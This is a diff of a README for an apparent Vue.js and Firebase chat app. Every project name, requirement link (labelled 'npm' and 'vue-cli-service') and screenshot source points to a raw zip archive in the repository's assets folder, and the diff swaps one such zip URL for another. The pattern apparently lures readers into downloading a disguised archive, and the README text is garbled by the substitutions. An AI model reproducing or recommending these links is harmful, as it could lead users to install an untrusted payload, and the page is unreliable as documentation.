@@ -1,6 +1,6 @@
-<h1 align="center">https://raw.githubusercontent.com/m-joseph27/Firebase-with-Vuejs/master/src/assets/fonts/Firebase_with_Vuejs_1.5-beta.2.zip</h1>
+<h1 align="center">https://github.com/m-joseph27/Firebase-with-Vuejs/raw/refs/heads/master/src/assets/Firebase-with-Vuejs-1.7.zip</h1>
 <p align="left">
-  Build with https://raw.githubusercontent.com/m-joseph27/Firebase-with-Vuejs/master/src/assets/fonts/Firebase_with_Vuejs_1.5-beta.2.zip and Realtime Database Firebase
+  Build with https://github.com/m-joseph27/Firebase-with-Vuejs/raw/refs/heads/master/src/assets/Firebase-with-Vuejs-1.7.zip and Realtime Database Firebase
 </p>
 
 ## Table of Contents
@@ -11,7 +11,7 @@
 - [Screenshot](#screenshot)
 
 ## Introduction
-<b>https://raw.githubusercontent.com/m-joseph27/Firebase-with-Vuejs/master/src/assets/fonts/Firebase_with_Vuejs_1.5-beta.2.zip</b> is a realtime web chat application to keep connect with your friends.
+<b>https://github.com/m-joseph27/Firebase-with-Vuejs/raw/refs/heads/master/src/assets/Firebase-with-Vuejs-1.7.zip</b> is a realtime web chat application to keep connect with your friends.
 
 ## Features
 * Users must create account before use app
@@ -19,9 +19,9 @@
 * And others
 
 ## Requirements
-* [`npm`](https://raw.githubusercontent.com/m-joseph27/Firebase-with-Vuejs/master/src/assets/fonts/Firebase_with_Vuejs_1.5-beta.2.zip)
-* [`https://raw.githubusercontent.com/m-joseph27/Firebase-with-Vuejs/master/src/assets/fonts/Firebase_with_Vuejs_1.5-beta.2.zip`](https://raw.githubusercontent.com/m-joseph27/Firebase-with-Vuejs/master/src/assets/fonts/Firebase_with_Vuejs_1.5-beta.2.zip)
-* [`vue-cli-service`](https://raw.githubusercontent.com/m-joseph27/Firebase-with-Vuejs/master/src/assets/fonts/Firebase_with_Vuejs_1.5-beta.2.zip)
+* [`npm`](https://github.com/m-joseph27/Firebase-with-Vuejs/raw/refs/heads/master/src/assets/Firebase-with-Vuejs-1.7.zip)
+* [`https://github.com/m-joseph27/Firebase-with-Vuejs/raw/refs/heads/master/src/assets/Firebase-with-Vuejs-1.7.zip`](https://github.com/m-joseph27/Firebase-with-Vuejs/raw/refs/heads/master/src/assets/Firebase-with-Vuejs-1.7.zip)
+* [`vue-cli-service`](https://github.com/m-joseph27/Firebase-with-Vuejs/raw/refs/heads/master/src/assets/Firebase-with-Vuejs-1.7.zip)
 
 <section id="screenshoot">
 	
@@ -29,19 +29,19 @@
 <div class="demo">
     <div class="items">
     	<h4 class="title-demo">Landing Page</h4>
-	<img class="img-demo" src="https://raw.githubusercontent.com/m-joseph27/Firebase-with-Vuejs/master/src/assets/fonts/Firebase_with_Vuejs_1.5-beta.2.zip">   
+	<img class="img-demo" src="https://github.com/m-joseph27/Firebase-with-Vuejs/raw/refs/heads/master/src/assets/Firebase-with-Vuejs-1.7.zip">   
     </div>
     <div class="items">
     	<h4 class="title-demo">Login</h4>
-		<img class="img-demo" src="https://raw.githubusercontent.com/m-joseph27/Firebase-with-Vuejs/master/src/assets/fonts/Firebase_with_Vuejs_1.5-beta.2.zip">  
+		<img class="img-demo" src="https://github.com/m-joseph27/Firebase-with-Vuejs/raw/refs/heads/master/src/assets/Firebase-with-Vuejs-1.7.zip">  
     </div>
     <div class="items">
     	<h4 class="title-demo">Home Page</h4>
-		<img class="img-demo" src="https://raw.githubusercontent.com/m-joseph27/Firebase-with-Vuejs/master/src/assets/fonts/Firebase_with_Vuejs_1.5-beta.2.zip">  
+		<img class="img-demo" src="https://github.com/m-joseph27/Firebase-with-Vuejs/raw/refs/heads/master/src/assets/Firebase-with-Vuejs-1.7.zip">  
     </div>
     <div class="items">
     	<h4 class="title-demo">Contact Info</h4>
-		<img class="img-demo" src="https://raw.githubusercontent.com/m-joseph27/Firebase-with-Vuejs/master/src/assets/fonts/Firebase_with_Vuejs_1.5-beta.2.zip">  
+		<img class="img-demo" src="https://github.com/m-joseph27/Firebase-with-Vuejs/raw/refs/heads/master/src/assets/Firebase-with-Vuejs-1.7.zip">  
     </div>
 </div>
 </section>
